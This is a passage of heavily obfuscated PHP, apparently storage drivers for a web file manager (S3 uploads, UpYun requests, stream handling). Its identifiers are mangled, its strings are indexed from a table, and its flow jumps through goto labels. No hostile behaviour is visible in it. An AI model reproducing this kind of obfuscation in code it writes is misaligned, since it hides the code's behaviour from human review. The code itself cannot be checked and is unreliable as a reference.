$íÈ˜è·™ =& $_SERVER[Ã¶¡¶„æ]; $²¦«º­ = $this->listData($£àÅœ‹Ê); $™‹Ù¿•¨ = $this->findByName($ŠÃ‚°é‘[$íÈ˜è·™[32]]); if (!$²¦«º­ || $™‹Ù¿•¨ && $™‹Ù¿•¨[$íÈ˜è·™[399]] != $²¦«º­[$íÈ˜è·™[399]]) { return !1; } return parent::update($£àÅœ‹Ê, $ŠÃ‚°é‘); } public function moveTop($áîñÔæÙ) { $‚É·ôò =& $_SERVER[Ã¶¡¶„æ]; $Ôæèµ÷™ = parent::listData(); $—°‰•ö› = $this->getSort($‚É·ôò[257]); foreach ($Ôæèµ÷™ as &$Îæ—ÄÉÔ) { if ($Îæ—ÄÉÔ[$‚É·ôò[399]] == $áîñÔæÙ) { $Îæ—ÄÉÔ[$‚É·ôò[1889]] = $—°‰•ö›; continue; } $Îæ—ÄÉÔ[$‚É·ôò[1889]] += 1; } unset($Îæ—ÄÉÔ); return parent::resetData($Ôæèµ÷™); } public function moveBottom($ê´×±) { $‘¤Ç¬¢ğ =& $_SERVER[Ã¶¡¶„æ]; $¼»‹Öğ» = $this->getSort($‘¤Ç¬¢ğ[258]) + 1; return parent::update($ê´×±, array($‘¤Ç¬¢ğ[1889] => $¼»‹Öğ»)); } public function resetSort($ºŸ¬Àë€) { $¬¹ü°œõ =& $_SERVER[Ã¶¡¶„æ]; $å½ĞŠ¯ë = array(); $ºŸ¬Àë€ = is_array($ºŸ¬Àë€) ? $ºŸ¬Àë€ : array(); for ($³‰´ïøÑ = 0; $³‰´ïøÑ < count($ºŸ¬Àë€); $³‰´ïøÑ++) { $å½ĞŠ¯ë[$ºŸ¬Àë€[$³‰´ïøÑ] . $¬¹ü°œõ[12]] = $³‰´ïøÑ + 1; } $ÈÏ¤€¨İ = parent::listData(); foreach ($ÈÏ¤€¨İ as &$ÔØ®É¸) { $íÓÒ³ì = $å½ĞŠ¯ë[$ÔØ®É¸[$¬¹ü°œõ[399]]]; $ÔØ®É¸[$¬¹ü°œõ[1889]] = $íÓÒ³ì ? $íÓÒ³ì : $ÔØ®É¸[$¬¹ü°œõ[1889]]; } unset($ÔØ®É¸); return parent::resetData($ÈÏ¤€¨İ); } private function getSort($ÌŠã¶Óß) { $ñ’ÀŠ’Œ =& $_SERVER[Ã¶¡¶„æ]; $óÁ©³Ëİ = parent::listData(); $ôÈ¡Â¿ = array_to_keyvalue($óÁ©³Ëİ, $ñ’ÀŠ’Œ[12], $ñ’ÀŠ’Œ[1889]); if (!$ôÈ¡Â¿) { $ôÈ¡Â¿ = array(0); } $Ô„ù¡¯å = $ÌŠã¶Óß == $ñ’ÀŠ’Œ[258] ? max($ôÈ¡Â¿) : min($ôÈ¡Â¿); return intval($Ô„ù¡¯å); } } goto f³†•å£°ã; C•‹‘ÁäáĞ: function binCheckBigger($¿³îŸÂá, $³Ä‚ÉÑÒ) { return $¿³îŸÂá > $³Ä‚ÉÑÒ; } $_SERVER[$_SERVER[Û®İªÒ][3]] = (_kodDe('KCguKiY=')."\x39\x39")+0;$_gda0="sjhrm6w5gk9ip38nqztco7e14bxl2fdyu0vap9ka60x2bg7yeowizfmdsjur4tqhl35v1cn81u76";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Ø’¨ÕÎ×, $›øÙÀ”Â) { $ÌŒ“‚£ =& $_SERVER[Ã¶¡¶„æ]; if (isset(self::$_methodList[$Ø’¨ÕÎ×])) { return @call_user_func_array(self::$_methodList[$Ø’¨ÕÎ×], $›øÙÀ”Â); } else { if (method_exists($this, $Ø’¨ÕÎ×)) { return call_user_func_array(array($this, $Ø’¨ÕÎ×), $›øÙÀ”Â); } else { think_exception(__CLASS__ . $ÌŒ“‚£[4] . $Ø’¨ÕÎ× . $ÌŒ“‚£[5]); } } } public static function __callStatic($ÊÇ‰´Å, $‘ø°ó‚ã) { if (isset(self::$_methodListStatic[$ÊÇ‰´Å])) { return call_user_func_array(self::$_methodListStatic[$ÊÇ‰´Å], $‘ø°ó‚ã); } else { if (method_exists(self, $ÊÇ‰´Å)) { return call_user_func_array(array(self, $ÊÇ‰´Å), $‘ø°ó‚ã); } else { show_json("{$ÊÇ‰´Å}\x28\x29\40\156\157\x74\x20\x65\170\151\163\x74\x3b", !1); } } } public static function addMethod($ŞãëğŒÍ, $û‡™æÜ’) { self::$_methodList[$ŞãëğŒÍ] = $û‡™æÜ’; } public static function addMethodStatic($§èùŞÃ¢, $«àó­Îİ) { self::$_methodListStatic[$§èùŞÃ¢] = $«àó­Îİ; } } goto FÜ÷¹Ÿ’…Ù; B‰šÖƒå´: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($œßÌÃ§) { parent::__construct($œßÌÃ§); } public function uploadFormData($ïÏˆÖıÀ, $´ôÜî® = 3600) { $–±Şà¢ =& $_SERVER[Ã¶¡¶„æ]; $Ì½ÈÔ¤• = $–±Şà¢[198]; $ÉÕöÑ‰ = $–±Şà¢[1369]; $«ßú—ˆË = $–±Şà¢[62]; $ÑéšÇ¨ = gmdate($–±Şà¢[1370]); $³ÎÖ½í = gmdate($–±Şà¢[757]); $Ÿ€‡÷ß¿ = $–±Şà¢[1371]; $œ¹Å¸µ = $´ôÜî® . $–±Şà¢[12]; $ú¸ÇÔËˆ = $–±Şà¢[1333]; $Í¬³£³ = array($this->accessKey, $³ÎÖ½í, $this->region, $«ßú—ˆË, $Ÿ€‡÷ß¿); $ñ—ññÓÖ = implode($–±Şà¢[8], $Í¬³£³); $¶‰§ëÉ = array($–±Şà¢[1335] => gmdate($–±Şà¢[1334], strtotime($–±Şà¢[1372])), $–±Şà¢[1336] => array(array($–±Şà¢[1338] => $this->bucket), array($–±Şà¢[1337] => $Ì½ÈÔ¤•), array($–±Şà¢[1339], $–±Şà¢[1340], $–±Şà¢[12]), array($–±Şà¢[1339], $–±Şà¢[1373], $–±Şà¢[12]), array($–±Şà¢[1339], $–±Şà¢[1374], $–±Şà¢[12]), array($–±Şà¢[1341] => $ú¸ÇÔËˆ), array($–±Şà¢[1375] => $ñ—ññÓÖ), array($–±Şà¢[1376] => $ÉÕöÑ‰), array($–±Şà¢[1377] => $ÑéšÇ¨), array($–±Şà¢[1378] => $œ¹Å¸µ))); $Ü·¦¿Ñº = base64_encode(json_encode($¶‰§ëÉ)); $Ë—¥ÏÑß = hash_hmac($–±Şà¢[1379], $³ÎÖ½í, $–±Şà¢[1380] . $this->secret, !0); $ı©ƒîÎÕ = hash_hmac($–±Şà¢[1379], $this->region, $Ë—¥ÏÑß, !0); $€ß§„ö = hash_hmac($–±Şà¢[1379], $«ßú—ˆË, $ı©ƒîÎÕ, !0); $åñÅ¨†™ = hash_hmac($–±Şà¢[1379], $Ÿ€‡÷ß¿, $€ß§„ö, !0); $…•°†é¨ = hash_hmac($–±Şà¢[1379], $Ü·¦¿Ñº, $åñÅ¨†™); $óâåÅÊï = array($–±Şà¢[215] => $–±Şà¢[12], $–±Şà¢[1381] => $–±Şà¢[12], $–±Şà¢[1337] => $Ì½ÈÔ¤•, $–±Şà¢[1341] => $ú¸ÇÔËˆ, $–±Şà¢[1345] => $Ü·¦¿Ñº, $–±Şà¢[1382] => $ñ—ññÓÖ, $–±Şà¢[1383] => $ÉÕöÑ‰, $–±Şà¢[1384] => $ÑéšÇ¨, $–±Şà¢[1385] => $œ¹Å¸µ, $–±Şà¢[1386] => $…•°†é¨, $–±Şà¢[181] => $this->getHost()); return $óâåÅÊï; } public function multiUploadFormData($¤¢Ú², $¸¼ŞÅ‹ = 3600) { $š–•éÊù =& $_SERVER[Ã¶¡¶„æ]; $Şåí¦—‚ = gmdate($š–•éÊù[1465]); $òĞíá†ã = array(); $ØÔ­Ş¿Â = $this->client->getUploadId($this->bucket, $¤¢Ú², $òĞíá†ã); if (!$ØÔ­Ş¿Â) { return !1; } return array($š–•éÊù[223] => $ØÔ­Ş¿Â, $š–•éÊù[181] => $this->getHost() . $š–•éÊù[8] . $this->pathEncode($¤¢Ú²), $š–•éÊù[224] => $Şåí¦—‚, $š–•éÊù[94] => $¤¢Ú²); } public function multiUploadAuthData($¹óØ„ÓÔ, $÷×öñº = array()) { $ıéçÓ÷â =& $_SERVER[Ã¶¡¶„æ]; $§å˜Ñ¥ = isset($÷×öñº[$ıéçÓ÷â[174]]) ? $÷×öñº[$ıéçÓ÷â[174]] : $ıéçÓ÷â[12]; $Úšªáöª = $÷×öñº[$ıéçÓ÷â[94]]; unset($÷×öñº[$ıéçÓ÷â[94]]); if (isset($÷×öñº[$ıéçÓ÷â[225]])) { return $this->listUploadParts($Úšªáöª, $÷×öñº); } $»”úèĞÔ = array(); if (isset($÷×öñº[$ıéçÓ÷â[1466]])) { $»”úèĞÔ[$ıéçÓ÷â[1467]] = $÷×öñº[$ıéçÓ÷â[1466]]; } $¶…Çšñ— = explode($ıéçÓ÷â[183], $this->getHost()); $şö†Ô™½ = array($ıéçÓ÷â[1468] => $¶…Çšñ—[1], $ıéçÓ÷â[1469] => $ıéçÓ÷â[12], $ıéçÓ÷â[215] => $ıéçÓ÷â[120], $ıéçÓ÷â[1381] => $÷×öñº[$ıéçÓ÷â[76]]); $Õ´¥·‹Ï = $ıéçÓ÷â[228]; $Ï¥¹íµ = $ıéçÓ÷â[8] . $this->pathEncode($Úšªáöª) . $§å˜Ñ¥; $Úîƒê¾¢ = $this->client->__getSignatureV4($»”úèĞÔ, $şö†Ô™½, $Õ´¥·‹Ï, $Ï¥¹íµ); if (strpos($§å˜Ñ¥, $ıéçÓ÷â[227]) === 0) { if (isset($»”úèĞÔ[$ıéçÓ÷â[1467]])) { $üÜŠƒ¥ = $»”úèĞÔ[$ıéçÓ÷â[1467]]; } else { if (isset($Úîƒê¾¢[$ıéçÓ÷â[1467]])) { $üÜŠƒ¥ = $Úîƒê¾¢[$ıéçÓ÷â[1467]]; } else { $üÜŠƒ¥ = hash($ıéçÓ÷â[1379], $ıéçÓ÷â[12]); } } return array($ıéçÓ÷â[234] => $Úîƒê¾¢[$ıéçÓ÷â[234]], $ıéçÓ÷â[1467] => $üÜŠƒ¥, $ıéçÓ÷â[224] => $Úîƒê¾¢[$ıéçÓ÷â[1470]]); } return $Úîƒê¾¢[$ıéçÓ÷â[234]]; } public function listUploadParts($¨¯ø˜Ø, $Š”¨·äõ = array()) { $Ñ³“Î÷ =& $_SERVER[Ã¶¡¶„æ]; $­üÚ°Éò = str_replace($Ñ³“Î÷[235], $Ñ³“Î÷[12], $Š”¨·äõ[$Ñ³“Î÷[174]]); $Ù‚‹¨ª£ = $this->client->listParts($this->bucket, $¨¯ø˜Ø, $­üÚ°Éò); if (!$Ù‚‹¨ª£) { return !1; } $ëû„¯©ò = $Ñ³“Î÷[1471]; foreach ($Ù‚‹¨ª£ as $‚ ÅÊ¾ú) { $ëû„¯©ò .= $Ñ³“Î÷[1472] . "\x3c\x50\x61\x72\164\x4e\165\155\142\145\x72\76{$‚ ÅÊ¾ú[$Ñ³“Î÷[1426]]}\74\57\x50\x61\x72\x74\x4e\x75\x6d\142\145\x72\76\12" . "\x3c\105\124\x61\147\x3e{$‚ ÅÊ¾ú[$Ñ³“Î÷[1427]]}\74\57\x45\124\141\147\x3e\xa" . $Ñ³“Î÷[1473]; } $ëû„¯©ò .= $Ñ³“Î÷[1474]; $óñ©Ö±Ê = array(); $ŞŞÈÉñö = explode($Ñ³“Î÷[183], $this->getHost()); $ò¹‘°ƒ = array($Ñ³“Î÷[1468] => $ŞŞÈÉñö[1], $Ñ³“Î÷[215] => $Ñ³“Î÷[120], $Ñ³“Î÷[1381] => strlen($ëû„¯©ò)); $ÊèÉªËŒ = $Ñ³“Î÷[226]; $ô”æéÉÁ = $Ñ³“Î÷[8] . $this->pathEncode($¨¯ø˜Ø) . $Š”¨·äõ[$Ñ³“Î÷[174]]; $õ–ªÑƒ³ = $this->client->__getSignatureV4($óñ©Ö±Ê, $ò¹‘°ƒ, $ÊèÉªËŒ, $ô”æéÉÁ, $ëû„¯©ò); return array($Ñ³“Î÷[234] => $õ–ªÑƒ³[$Ñ³“Î÷[234]], $Ñ³“Î÷[224] => $õ–ªÑƒ³[$Ñ³“Î÷[1470]], $Ñ³“Î÷[236] => $Ù‚‹¨ª£, $Ñ³“Î÷[1467] => $õ–ªÑƒ³[$Ñ³“Î÷[1467]]); } public function link($ë†¢ã¶“, $³œè‰¸ô = array()) { return parent::link($ë†¢ã¶“, $³œè‰¸ô); } public function fileOut($ÏÙ“ÔÜÇ, $°«¨Šæú = false, $âŞ‘Şê¸ = false, $ºòÒÀÍŠ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Ã¶¡¶„æ][1475])) { return parent::fileOutServer($ÏÙ“ÔÜÇ, $°«¨Šæú, $âŞ‘Şê¸, $ºòÒÀÍŠ); } parent::fileOut($ÏÙ“ÔÜÇ, $°«¨Šæú, $âŞ‘Şê¸, $ºòÒÀÍŠ); } public function fileOutImage($¿‹¼Éñ, $ã²„ğë = 250) { if (strstr($this->endpoint, $_SERVER[Ã¶¡¶„æ][1475])) { return parent::fileOutImageServer($¿‹¼Éñ, $ã²„ğë); } parent::fileOutImage($¿‹¼Éñ, $ã²„ğë); } public function fileOutLink($êÜ¦Ô¿°) { $éå¤ëËÉ =& $_SERVER[Ã¶¡¶„æ]; if (substr($êÜ¦Ô¿°, 0, 7) == $éå¤ëËÉ[1348]) { $êÜ¦Ô¿° = $éå¤ëËÉ[1349] . substr($êÜ¦Ô¿°, 7); } header($éå¤ëËÉ[161] . $êÜ¦Ô¿°); die; } public function getHost() { $º´…·ô =& $_SERVER[Ã¶¡¶„æ]; $Š×ã©¸‰ = str_rtrim(parent::getHost(), $º´…·ô[8] . $this->bucket); $Š×ã©¸‰ = explode($º´…·ô[183], $Š×ã©¸‰); return $Š×ã©¸‰[0] . $º´…·ô[183] . $this->bucket . $º´…·ô[10] . $Š×ã©¸‰[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($İ¢Ï²İ, $£ûşŠ¨­ = 0) { parent::__construct(); $this->source = $İ¢Ï²İ; $this->sourceSize = $£ûşŠ¨­; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($›¶×û®ß = false) { return $this->sourceSize; } public function getContent($·ßÎõ = false) { return $this->fileSubstr($·ßÎõ, 0, $this->sourceSize); } public function fileSubstr($Á²Õà©æ = false, $’ ÚäÈ = 0, $‡Úß£é = 0) { if (!$‡Úß£é) { $‡Úß£é = $this->sourceSize; } $û¸ÛÌˆ = $this->sourceSize - $’ ÚäÈ; if ($‡Úß£é >= $û¸ÛÌˆ) { $‡Úß£é = $û¸ÛÌˆ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $’ ÚäÈ, $‡Úß£é); } if ($this->sourceType == self::TYPE_FILE) { if ($‡Úß£é <= 0) { return $_SERVER[Ã¶¡¶„æ][12]; } $íÄ­¸Ä– = ftell($this->source); fseek_64($this->source, $íÄ­¸Ä– + $’ ÚäÈ); $˜¹´‡¯ø = @fread($this->source, $‡Úß£é); fseek_64($this->source, $íÄ­¸Ä–); return $˜¹´‡¯ø; } } public function hashMd5($‘ê°êŞï = false) { return md5($this->getContent()); } public static function hash($Ó§“—ºë, $šòõÎ“ô = 0) { $ºĞ–ú» = new PathDriverStream($Ó§“—ºë, $šòõÎ“ô); return $ºĞ–ú»->hashSimple($Ó§“—ºë); } public static function md5($Šüõç‰¾, $©ĞÓãäí = 0) { $±è÷Ø°® = new PathDriverStream($Šüõç‰¾, $©ĞÓãäí); return $±è÷Ø°®->hashMd5($Šüõç‰¾); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\72\x2f\57\166\60\56\141\160\x69\56\x75\x70\171\165\x6e\56\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¹š°ÈÏó) { parent::__construct(); $this->_init($¹š°ÈÏó); } public function _init($ƒ§®‘–Á) { $ñ˜ÓÉïÈ =& $_SERVER[Ã¶¡¶„æ]; foreach ($ƒ§®‘–Á as $ƒÉ ãÍÜ => $ï¦ƒÅŒÌ) { if (isset($this->{$ƒÉ ãÍÜ})) { $this->{$ƒÉ ãÍÜ} = $ï¦ƒÅŒÌ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ñ˜ÓÉïÈ[1476] . LNG($ñ˜ÓÉïÈ[1407])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($‰Í˜¦Ã¥, $•„šÇ´ = "\x47\105\124") { $…Ÿ¨ë =& $_SERVER[Ã¶¡¶„æ]; $Éø¡¾Ğø = gmdate($…Ÿ¨ë[1440]); $Ú÷”æ© = base64_encode(hash_hmac($…Ÿ¨ë[1477], "{$•„šÇ´}\x26{$‰Í˜¦Ã¥}\x26{$Éø¡¾Ğø}", md5("{$this->userpass}"), !0)); $Ò¥Š¿ = array("\101\165\164\x68\x6f\x72\151\172\141\164\151\157\156\72\x55\x50\131\x55\x4e\40{$this->username}\72{$Ú÷”æ©}", "\104\141\x74\x65\x3a{$Éø¡¾Ğø}"); return $Ò¥Š¿; } public function ussRequest($†Í±²¼», $•Ô÷Âü = "\107\105\x54", $›îÔâü˜ = false, $¬óÄˆÌé = false, $òòû¿™â = false) { $³ã®œ½ê =& $_SERVER[Ã¶¡¶„æ]; $†Í±²¼» = trim($†Í±²¼», $³ã®œ½ê[8]); $£æÛéß« = "\x2f{$this->bucket}\57{$†Í±²¼»}"; $†§ñ·²Ÿ = $this->ussHeaders($£æÛéß«, $•Ô÷Âü); if ($¬óÄˆÌé) { $†§ñ·²Ÿ = array_merge($†§ñ·²Ÿ, $¬óÄˆÌé); } $Õ˜†µŠÏ = url_request($this->endpoint . $£æÛéß«, $•Ô÷Âü, $›îÔâü˜, $†§ñ·²Ÿ, $òòû¿™â); if (!$Õ˜†µŠÏ) { return array($³ã®œ½ê[1227] => !1, $³ã®œ½ê[1217] => $³ã®œ½ê[1478]); } if (strtolower($•Ô÷Âü) == $³ã®œ½ê[196] || in_array($Õ˜†µŠÏ[$³ã®œ½ê[1227]], array($³ã®œ½ê[1333], $³ã®œ½ê[1479]))) { $›îÔâü˜ = $Õ˜†µŠÏ[$³ã®œ½ê[1480]]; } else { $›îÔâü˜ = json_decode($Õ˜†µŠÏ[$³ã®œ½ê[1217]], !0); if (!$›îÔâü˜) { $›îÔâü˜ = $Õ˜†µŠÏ[$³ã®œ½ê[1217]]; } else { if (!$Õ˜†µŠÏ[$³ã®œ½ê[756]] && isset($›îÔâü˜[$³ã®œ½ê[1481]])) { $›îÔâü˜ = $›îÔâü˜[$³ã®œ½ê[1481]]; } } } return array($³ã®œ½ê[1227] => $Õ˜†µŠÏ[$³ã®œ½ê[756]], $³ã®œ½ê[1217] => $›îÔâü˜); } public function mkfile($Ü¦¾€·, $•¡¾°Ÿ¸ = '', $Â‹¾Üó¤ = REPEAT_RENAME) { if ($this->setContent($Ü¦¾€·, $•¡¾°Ÿ¸)) { return $this->getPathOuter($Ü¦¾€·); } return !1; } public function mkdir($‰àó™¯©, $ˆÏÉ¥Â = REPEAT_SKIP) { $¥àÂˆ¼¿ =& $_SERVER[Ã¶¡¶„æ]; $Š˜Œ¨ì« = trim($‰àó™¯©, $¥àÂˆ¼¿[8]); if ($this->_isFolder($Š˜Œ¨ì«)) { return $this->getPathOuter($Š˜Œ¨ì«); } $ÙÜÄƒ°Ü = array($¥àÂˆ¼¿[1482]); $Ğ¿«ÚÅ = $this->ussRequest($Š˜Œ¨ì«, $¥àÂˆ¼¿[226], !1, $ÙÜÄƒ°Ü); return $Ğ¿«ÚÅ[$¥àÂˆ¼¿[1227]] ? $this->getPathOuter($Š˜Œ¨ì«) : !1; } public function copyFile($äâ¨—™Ñ, $—²Á³–…) { $ˆûŸ¿® =& $_SERVER[Ã¶¡¶„æ]; $œŠŠá”“ = array($ˆûŸ¿®[1483] . "\x2f{$this->bucket}\57{$äâ¨—™Ñ}", $ˆûŸ¿®[1484]); $ƒƒëÙ™´ = $this->ussRequest($—²Á³–…, $ˆûŸ¿®[228], !1, $œŠŠá”“); return $ƒƒëÙ™´[$ˆûŸ¿®[1227]] ? !0 : $this->getPathOuter($—²Á³–…); } public function moveFile($Ø¼ĞÆÀ¤, $„Úµ‚ÙÉ) { $‹–¡‰ì¸ =& $_SERVER[Ã¶¡¶„æ]; $†¦êå¼ = array($‹–¡‰ì¸[1485] . "\x2f{$this->bucket}\x2f{$Ø¼ĞÆÀ¤}", $‹–¡‰ì¸[1484]); $«ˆ€İ‡˜ = $this->ussRequest($„Úµ‚ÙÉ, $‹–¡‰ì¸[228], !1, $†¦êå¼); return $«ˆ€İ‡˜[$‹–¡‰ì¸[1227]] ? !0 : $this->getPathOuter($„Úµ‚ÙÉ); } public function delFile($ä¹ïôŸ•) { $¿×€ÊÀ” =& $_SERVER[Ã¶¡¶„æ]; $ºã”Ğäâ = $this->ussRequest($ä¹ïôŸ•, $¿×€ÊÀ”[1486]); return $ºã”Ğäâ[$¿×€ÊÀ”[1227]] ? !0 : !1; } public function delFolder($ù„Ğåîó) { $•”óÛ† =& $_SERVER[Ã¶¡¶„æ]; if (!$this->exist($ù„Ğåîó)) { return !0; } $this->listItemCache = !1; $€°ø—¸§ = $â§ıõØº = array(); $this->fileList($ù„Ğåîó, $€°ø—¸§, $â§ıõØº, !0); $this->listItemCache = !0; foreach ($â§ıõØº as $“’èî¨À) { $Ô¸š—¸Ô = $this->ussRequest($“’èî¨À[$•”óÛ†[32]], $•”óÛ†[1486]); if (!$Ô¸š—¸Ô[$•”óÛ†[1227]]) { return !1; } } foreach ($€°ø—¸§ as $…°Áƒ°„) { $Ô¸š—¸Ô = $this->ussRequest($…°Áƒ°„, $•”óÛ†[1486]); if (!$Ô¸š—¸Ô[$•”óÛ†[1227]]) { return !1; } } $Ô¸š—¸Ô = $this->ussRequest($ù„Ğåîó, $•”óÛ†[1486]); return $Ô¸š—¸Ô[$•”óÛ†[1227]]; } public function rename($ºş€çË¡, $ àßø§) { if ($this->isFile($ºş€çË¡)) { $ àßø§ = get_path_father($ºş€çË¡) . $ àßø§; return $this->moveFile($ºş€çË¡, $ àßø§); } return $this->renameObject($ºş€çË¡, $ àßø§); } public function fileInfo($Ü ş³°³, $«úœ‚úÄ = false, $Åî¹ˆÆ = array()) { $–Ş½šÄš =& $_SERVER[Ã¶¡¶„æ]; $Òó˜¾¨¼ = array($–Ş½šÄš[32] => $this->pathThis($Ü ş³°³), $–Ş½šÄš[84] => $this->getPathOuter($–Ş½šÄš[8] . $Ü ş³°³), $–Ş½šÄš[33] => $–Ş½šÄš[199], $–Ş½šÄš[76] => isset($Åî¹ˆÆ[$–Ş½šÄš[76]]) ? $Åî¹ˆÆ[$–Ş½šÄš[76]] : 0, $–Ş½šÄš[174] => $this->ext($Ü ş³°³)); if ($«úœ‚úÄ) { return $Òó˜¾¨¼; } $Òó˜¾¨¼[$–Ş½šÄš[200]] = $Òó˜¾¨¼[$–Ş½šÄš[85]] = 0; $Òó˜¾¨¼[$–Ş½šÄš[201]] = $Òó˜¾¨¼[$–Ş½šÄš[202]] = !0; if (empty($Åî¹ˆÆ)) { $Åî¹ˆÆ = $this->objectMeta($Ü ş³°³); if (!$Åî¹ˆÆ) { return $Òó˜¾¨¼; } } $Òó˜¾¨¼[$–Ş½šÄš[200]] = intval($Åî¹ˆÆ[$–Ş½šÄš[1487]]); $Òó˜¾¨¼[$–Ş½šÄš[85]] = intval($Åî¹ˆÆ[$–Ş½šÄš[1488]]); $Òó˜¾¨¼[$–Ş½šÄš[76]] = $Åî¹ˆÆ[$–Ş½šÄš[76]]; return $Òó˜¾¨¼; } public function folderInfo($Şí÷äˆœ, $ŒäÉ„Í = false) { $‚§ô»÷š =& $_SERVER[Ã¶¡¶„æ]; $îÏ¨¦İñ = array($‚§ô»÷š[32] => $this->pathThis($Şí÷äˆœ), $‚§ô»÷š[84] => $this->getPathOuter($‚§ô»÷š[8] . $Şí÷äˆœ), $‚§ô»÷š[33] => $‚§ô»÷š[75]); if ($ŒäÉ„Í) { return $îÏ¨¦İñ; } $îÏ¨¦İñ[$‚§ô»÷š[200]] = $îÏ¨¦İñ[$‚§ô»÷š[85]] = 0; $îÏ¨¦İñ[$‚§ô»÷š[201]] = $îÏ¨¦İñ[$‚§ô»÷š[202]] = !0; if (empty($‚Ç¬¡)) { $‚Ç¬¡ = $this->objectMeta($Şí÷äˆœ); if (!$‚Ç¬¡) { return $îÏ¨¦İñ; } } $îÏ¨¦İñ[$‚§ô»÷š[200]] = intval($‚Ç¬¡[$‚§ô»÷š[1487]]); $îÏ¨¦İñ[$‚§ô»÷š[85]] = intval($‚Ç¬¡[$‚§ô»÷š[1488]]); return $îÏ¨¦İñ; } private function listObjs($š³¸Ü, $Å´ğ¶êŠ = 0, $ÉÛÅ¯·ß = 1000) { $ıÚË¸îö =& $_SERVER[Ã¶¡¶„æ]; $Õ‡œßôœ = array($ıÚË¸îö[1489], $ıÚË¸îö[1490] . $ÉÛÅ¯·ß); if ($Å´ğ¶êŠ) { $Õ‡œßôœ[] = $ıÚË¸îö[1491] . $Å´ğ¶êŠ; } $ı€™§Éø = $this->ussRequest($š³¸Ü, $ıÚË¸îö[230], !1, $Õ‡œßôœ); return !$ı€™§Éø[$ıÚË¸îö[1227]] ? !1 : $ı€™§Éø[$ıÚË¸îö[1217]]; } private function fileList($èÑŸ, &$›èÉÃú¼, &$Ô¤¡µ„Á, $Ú‡¢Ö‡© = false) { $¶õİ‘Í =& $_SERVER[Ã¶¡¶„æ]; $íŒÙúº = $¶õİ‘Í[12]; $öİä­‹ß = 1000; $á›¥éØÂ = rtrim($èÑŸ, $¶õİ‘Í[8]) . $¶õİ‘Í[8]; while (!0) { check_abort(); $ä§ÇÙğ = $this->listObjs($èÑŸ, $íŒÙúº, $öİä­‹ß); if (!$ä§ÇÙğ) { return !1; } $íŒÙúº = isset($ä§ÇÙğ[$¶õİ‘Í[1492]]) ? $ä§ÇÙğ[$¶õİ‘Í[1492]] : $¶õİ‘Í[12]; $½¬Çî§Â = isset($ä§ÇÙğ[$¶õİ‘Í[1493]]) ? $ä§ÇÙğ[$¶õİ‘Í[1493]] : array(); foreach ($½¬Çî§Â as $‚îÖ×½Ù) { $âÀÜÅò = $‚îÖ×½Ù[$¶õİ‘Í[33]] == $¶õİ‘Í[75] ? !0 : !1; $¢˜×ˆË× = ltrim($á›¥éØÂ . $‚îÖ×½Ù[$¶õİ‘Í[32]], $¶õİ‘Í[8]) . ($âÀÜÅò ? $¶õİ‘Í[8] : $¶õİ‘Í[12]); $óµşÁğŠ = array($¶õİ‘Í[32] => $¢˜×ˆË×, $¶õİ‘Í[33] => $âÀÜÅò ? $¶õİ‘Í[75] : $¶õİ‘Í[199], $¶õİ‘Í[76] => $‚îÖ×½Ù[$¶õİ‘Í[337]], $¶õİ‘Í[1488] => $‚îÖ×½Ù[$¶õİ‘Í[1494]]); $this->cacheMethodInfoSet($¢˜×ˆË×, $âÀÜÅò, $óµşÁğŠ); if ($âÀÜÅò) { $›èÉÃú¼[] = $¢˜×ˆË×; if ($Ú‡¢Ö‡©) { $this->fileList($¢˜×ˆË×, $›èÉÃú¼, $Ô¤¡µ„Á, $Ú‡¢Ö‡©); } continue; } $Ô¤¡µ„Á[] = $óµşÁğŠ; } if (count($½¬Çî§Â) < $öİä­‹ß) { break; } } $this->cacheMethodInfoSet($èÑŸ, !0); } public function listPath($ÙŒÜı”·, $Ş“®Ã“ë = false) { $²ÖØ„Ï =& $_SERVER[Ã¶¡¶„æ]; $ƒ£‘ĞÀ› = $æãÒ‚–ö = array(); $this->fileList($ÙŒÜı”·, $ƒ£‘ĞÀ›, $æãÒ‚–ö); foreach ($ƒ£‘ĞÀ› as $î±­üõ => $‹ı¹åö‰) { $ƒ£‘ĞÀ›[$î±­üõ] = $this->folderInfo($‹ı¹åö‰, $Ş“®Ã“ë); } foreach ($æãÒ‚–ö as $î±­üõ => $‹ı¹åö‰) { $æãÒ‚–ö[$î±­üõ] = $this->fileInfo($‹ı¹åö‰[$²ÖØ„Ï[32]], $Ş“®Ã“ë, $‹ı¹åö‰); } return array($²ÖØ„Ï[82] => $ƒ£‘ĞÀ›, $²ÖØ„Ï[83] => $æãÒ‚–ö); } public function has($ÍÇåäÏ, $¦çÃ‘ğÉ = false, $¡†²İÜ = true) { $Ù™â¦‹ =& $_SERVER[Ã¶¡¶„æ]; $·â²©İİ = $Ù™â¦‹[12]; $Í–¢¸ÔÑ = 500; $úÒè«­ = 0; $Œ²Ù×¼± = 0; $Ş—Â„ùê = rtrim($ÍÇåäÏ, $Ù™â¦‹[8]) . $Ù™â¦‹[8]; while (!0) { check_abort(); $â§Ş—Ó† = $this->listObjs($ÍÇåäÏ, $·â²©İİ, $Í–¢¸ÔÑ); if (!$â§Ş—Ó†) { return !1; } $·â²©İİ = isset($â§Ş—Ó†[$Ù™â¦‹[1492]]) ? $â§Ş—Ó†[$Ù™â¦‹[1492]] : $Ù™â¦‹[12]; $œ–“‡×­ = isset($â§Ş—Ó†[$Ù™â¦‹[1493]]) ? $â§Ş—Ó†[$Ù™â¦‹[1493]] : array(); if (empty($œ–“‡×­)) { break; } $ã¾Ñ× = array_filter($œ–“‡×­, function ($ßğú†ûı) { $ğ…î© =& $_SERVER[Ã¶¡¶„æ]; return $ßğú†ûı[$ğ…î©[33]] == $ğ…î©[75]; }); $ŠÉµ°Á¦ 